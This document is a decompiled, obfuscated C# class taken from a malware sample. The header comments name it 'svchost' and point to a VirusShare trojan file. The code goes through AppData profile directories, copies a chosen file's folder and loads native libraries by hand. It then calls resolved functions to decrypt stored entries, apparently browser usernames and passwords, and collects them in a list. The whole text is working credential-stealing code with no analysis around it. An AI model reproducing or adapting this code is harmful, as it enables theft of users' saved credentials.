// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

internal sealed class \u0003\u2000
{
  private static IntPtr \u0002;

  public static void \u0002()
  {
    string str1 = string.Empty;
    string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0005\u2003.\u0002(1067757040);
    foreach (string directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0005\u2003.\u0002(1067757016)))
    {
      foreach (string file in Directory.GetFiles(directory, \u0005\u2003.\u0002(1067756088)))
      {
        if (file.Contains(\u0005\u2003.\u0002(1067756041)))
        {
          str1 = file;
          \u0003\u2000.\u0002(directory, str2);
        }
      }
    }
    \u0003\u2003 obj = new \u0003\u2003(str1);
    obj.\u0002(\u0005\u2003.\u0002(1067756052));
    for (int index = 0; index <= obj.\u0002() - 1; ++index)
    {
      string str3 = obj.\u0002(index, \u0005\u2003.\u0002(1067756135));
      string str4 = obj.\u0002(index, \u0005\u2003.\u0002(1067756148));
      string str5 = \u0003\u2000.\u0002(obj.\u0002(index, \u0005\u2003.\u0002(1067756096)));
      string str6 = \u0003\u2000.\u0002(obj.\u0002(index, \u0005\u2003.\u0002(1067756200)));
      \u000F\u2000.\u0002.Add(new \u0008\u2000(\u0005\u2003.\u0002(1067756208), str3, str5, str6, str4));
    }
  }

  public static string \u0002(string _param0)
  {
    StringBuilder stringBuilder = new StringBuilder(_param0);
    \u0003\u2000.\u0003 obj = new \u0003\u2000.\u0003();
    \u0003\u2000.\u0002(\u0003\u2000.\u0002(), true, 0L);
    \u0003\u2000.\u0003 structure = (\u0003\u2000.\u0003) Marshal.PtrToStructure(new IntPtr(\u0003\u2000.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length)), typeof (\u0003\u2000.\u0003));
    if (\u0003\u2000.\u0002(ref structure, ref obj, 0) != 0 || obj.\u0005 == 0)
      return \u0005\u2003.\u0002(1067756166);
    byte[] numArray = new byte[obj.\u0005];
    Marshal.Copy(new IntPtr(obj.\u0003), numArray, 0, obj.\u0005);
    return Encoding.ASCII.GetString(numArray);
  }

  public static long \u0002(string _param0, string _param1)
  {
    \u0003\u2000.LoadLibrary(_param1 + \u0005\u2003.\u0002(1067756186));
    \u0003\u2000.LoadLibrary(_param1 + \u0005\u2003.\u0002(1067756260));
    \u0003\u2000.LoadLibrary(_param1 + \u0005\u2003.\u0002(1067756276));
    \u0003\u2000.LoadLibrary(_param1 + \u0005\u2003.\u0002(1067756229));
    \u0003\u2000.LoadLibrary(_param1 + \u0005\u2003.\u0002(1067756245));
    \u0003\u2000.\u0002 = \u0003\u2000.LoadLibrary(_param1 + \u0005\u2003.\u0002(1067756326));
    return ((\u0003\u2000.\u0005) Marshal.GetDelegateForFunctionPointer(\u0003\u2000.GetProcAddress(\u0003\u2000.\u0002, \u0005\u2003.\u0002(1067756343)), typeof (\u0003\u2000.\u0005)))(_param0);
  }

  public static long \u0002() => ((\u0003\u2000.\u0008) Marshal.GetDelegateForFunctionPointer(\u0003\u2000.GetProcAddress(\u0003\u2000.\u0002, \u0005\u2003.\u0002(1067756292)), typeof (\u0003\u2000.\u0008)))();

  public static long \u0002(long _param0, bool _param1, long _param2) => ((\u0003\u2000.\u0006) Marshal.GetDelegateForFunctionPointer(\u0003\u2000.GetProcAddress(\u0003\u2000.\u0002, \u0005\u2003.\u0002(1067756394)), typeof (\u0003\u2000.\u0006)))(_param0, _param1, _param2);

  public static int \u0002(IntPtr _param0, IntPtr _param1, StringBuilder _param2, int _param3) => ((\u0003\u2000.\u000E) Marshal.GetDelegateForFunctionPointer(\u0003\u2000.GetProcAddress(\u0003\u2000.\u0002, \u0005\u2003.\u0002(1067756402)), typeof (\u0003\u2000.\u000E)))(_param0, _param1, _param2, _param3);

  public static int \u0002(
    ref \u0003\u2000.\u0003 _param0,
    ref \u0003\u2000.\u0003 _param1,
    int _param2)
  {
    return ((\u0003\u2000.\u000F) Marshal.GetDelegateForFunctionPointer(\u0003\u2000.GetProcAddress(\u0003\u2000.\u0002, \u0005\u2003.\u0002(1067756369)), typeof (\u0003\u2000.\u000F)))(ref _param0, ref _param1, _param2);
  }

  [DllImport("kernel32.dll")]
  private static extern IntPtr LoadLibrary(string _param0);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr GetProcAddress(IntPtr _param0, string _param1);

  public sealed class \u0002
  {
    public static long \u0002;
    public static byte[] \u0003;
  }

  public struct \u0003
  {
    public int \u0002;
    public int \u0003;
    public int \u0005;
  }

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long \u0005(string _param1);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long \u0006(long _param1, bool _param2, long _param3);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long \u0008();

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int \u000E(IntPtr _param1, IntPtr _param2, StringBuilder _param3, int _param4);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int \u000F(
    ref \u0003\u2000.\u0003 _param1,
    ref \u0003\u2000.\u0003 _param2,
    int _param3);
}
